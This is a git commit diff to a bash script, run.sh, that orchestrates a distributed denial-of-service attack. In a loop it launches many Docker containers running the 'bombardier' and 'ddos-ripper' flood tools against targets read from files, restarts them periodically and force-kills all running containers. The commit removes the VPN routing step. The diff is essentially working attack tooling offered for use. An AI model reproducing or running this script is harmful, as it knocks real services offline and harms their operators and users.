3f791489c86f2734d9efe9e2ced2546700489e47
PrivateHenker <100619098+PrivateHenker@users.noreply.github.com>
2022-02-28 22:10:27 +0100

    Update run.sh

--- run.sh
+++ run.sh
@@ -5,18 +5,22 @@ RESOURCES_FILE_RIPPER=$3
 INSTANCE_PER_RIPPER=$4
 TTL=$5
 
+
 LOOP_COUNT = 1
-STEPS = $(expr $TTL / 30 )
+STEPS = $(expr $TTL / 30)
+echo "$STEPS"
+
 
 echo "Bombardier file: $RESOURCES_FILE_BOMB with $INSTANCE_PER_BOMB instances per url"
 echo "Ripper file: $RESOURCES_FILE_RIPPER with $INSTANCE_PER_RIPPER instances per url"
 echo "Restarting instances every $TTL seconds"
 
+
 while true
 do
    echo "Starting loop $LOOP_COUNT..."
-   
-   
+
+
    echo "Killing all running docker instances..."
    sudo docker rm -f $(sudo docker ps -aq) >/dev/null 2>&1 || true
    for i in {0..4} ; do
@@ -28,19 +32,6 @@ do
        sleep 1
    done
    echo "Killed all instances."
-   
-   
-   echo "Starting VPN (from docker-compose)..."
-   sudo docker-compose up -d
-   for i in {0..14} ; do
-       echo -n '['
-       for ((j=0; j<i; j++)) ; do echo -n '#'; done
-       echo -n ''
-       for ((j=i; j<14; j++)) ; do echo -n ' '; done
-       echo -n "] $i / 15s" $'\r'
-       sleep 1
-   done
-   echo "VPN started."
 
 
    echo "Starting Bombardier instances..."
@@ -51,13 +42,13 @@ do
       for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
       do
          {
-            sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $BOMB 
+            sudo docker run -d -m 128m --cpus=2 --rm alpine/bombardier -c 1000 -d 540s -l $BOMB 
          } &> /dev/null
       done
    done
    echo "Bombardier instances started."
-   
-   
+
+
    echo "Starting Ripper instances..."
    IFS=$'\n' read -d '' -r -a linesripper < $RESOURCES_FILE_RIPPER
    for RIP in "${linesripper[@]}"
@@ -66,13 +57,13 @@ do
       for (( c=1; c<=$INSTANCE_PER_RIPPER; c++ ))
       do
          {
-            sudo docker run -d -m 256m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $RIP
+            sudo docker run -d -m 256m --cpus=2 --rm nitupkcuf/ddos-ripper $RIP
          } &> /dev/null
       done
    done
    echo "Ripper instances started."
-   
-   
+
+
    echo "Waiting for $TTL seconds."
    for i in {1..29} ; do
        echo -n '['
